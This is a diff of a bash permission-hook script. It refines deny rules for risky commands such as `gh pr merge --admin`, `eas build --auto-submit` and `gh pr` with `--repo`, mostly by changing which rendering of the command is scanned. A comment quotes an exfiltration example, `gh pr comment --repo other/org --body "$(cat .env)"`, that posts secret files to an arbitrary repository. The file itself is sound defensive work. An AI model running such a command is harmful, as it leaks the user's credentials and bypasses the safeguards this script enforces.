@@ -208,13 +208,9 @@ _OUT_POS_SUFFIX='([[:space:]]|[);&|`]|$)'
 _OUT_REPO_FLAG_RE='(^|[^-A-Za-z0-9])(--repo([^-A-Za-z0-9]|$)|-R)'
 
 # gh_pr_clause_has_repo <subcommand-alternation> → exit 0 if the FIRST
-# `gh pr <sub>` clause in the RAW command carries --repo/-R.
+# `gh pr <sub>` clause in $WORDS carries --repo/-R.
 #
-# RAW $CMD, not $BARE: a quoted flag NAME is still a real argv token
-# (`gh pr comment "--repo" other/org` behaves identically to the unquoted
-# form), and cmd_bare would blank it out of view — the same reasoning the
-# `--admin` check below documents.
-# CLAUSE-SCOPED, unlike that --admin check: `--admin` survives a whole-command
+# CLAUSE-SCOPED, unlike the `--admin` check below: `--admin` survives a whole-command
 # scan because it is a rare token, but `-R` is `cp -R`, `grep -R`, `ls -R`,
 # `rsync -R`. A whole-$CMD scan denied `cp -R src dst && gh pr create --title
 # x --body y` — i.e. this repo's own PR-creation pipeline (caught in review
@@ -463,9 +459,11 @@ fi
 # `eas build --auto-submit` (and --auto-submit-with-profile) submits the
 # resulting binary to the store as soon as the build finishes — a store
 # mutation wearing a build command's name. Plain `eas build` stays allowed.
-# The flag check DELIBERATELY scans raw $CMD, not $BARE: like `--admin` below,
-# a quoted `"--auto-submit"` is still a real argv token, and this check can
-# only ever ADD a deny. No trailing boundary, so `--auto-submit-with-profile`
+# Scans BOTH renderings: raw $CMD (a quoted `"--auto-submit"` is still a real
+# argv token) and $WORDS (a quoted-split NAME is only visible there) — the
+# same dual-scan the `--admin` check below uses, and for the same reason: a
+# deny-only check can read both for free, since it can only ever ADD a deny,
+# never grant a carve-out. No trailing boundary, so `--auto-submit-with-profile`
 # is caught by the same pattern.
 if grep -Eqi "${_OUT_POS_PREFIX}eas[[:space:]]+build${_OUT_POS_SUFFIX}" <<< "$WORDS" \
    && grep -Eq '(^|[^-A-Za-z0-9])--auto-submit' <<< "$CMD
@@ -595,9 +593,10 @@ elif [ "${GH_PR_MERGE_OCCURRENCES:-0}" -eq 1 ]; then
   # value, or mentioned in an unrelated clause) is the safe direction, so no
   # value-flag predecessor check or clause-scoping is needed the way --auto's
   # decoy check above needs one: this check can only ever ADD a deny, never
-  # grant a carve-out. DELIBERATELY scans the RAW $CMD (not $BARE/$CLAUSE):
-  # `--admin` is a genuine, functioning argv token whether or not the shell
-  # quoted it (quotes affect word-splitting, not what gh actually receives —
+  # grant a carve-out. DELIBERATELY avoids $BARE/$CLAUSE (see below for which
+  # renderings it scans instead): `--admin` is a genuine, functioning argv
+  # token whether or not the shell quoted it (quotes affect word-splitting,
+  # not what gh actually receives —
   # `gh pr merge 42 --auto "--admin"` passes the literal string `--admin`,
   # identically to the unquoted form), so relying on cmd_bare here — which
   # deliberately blanks quoted CONTENT to avoid false-positiving on a quoted
@@ -633,7 +632,7 @@ fi
 # arbitrary GitHub repository with the user's PAT (`gh pr comment --repo
 # other/org --body "$(cat .env)"` was ALLOWED, review round 3). Same treatment
 # lib/cmd-detect.sh:242 already gives the flag, and this repo's own PR flow
-# never passes it. Clause-scoped raw-$CMD flag scan — see gh_pr_clause_has_repo.
+# never passes it. Clause-scoped $WORDS flag scan — see gh_pr_clause_has_repo.
 #
 # COUNTED, matching the gh pr merge treatment above (review round 4,
 # 2026-08-17): gh_pr_clause_has_repo's `head -1` only ever inspects the FIRST
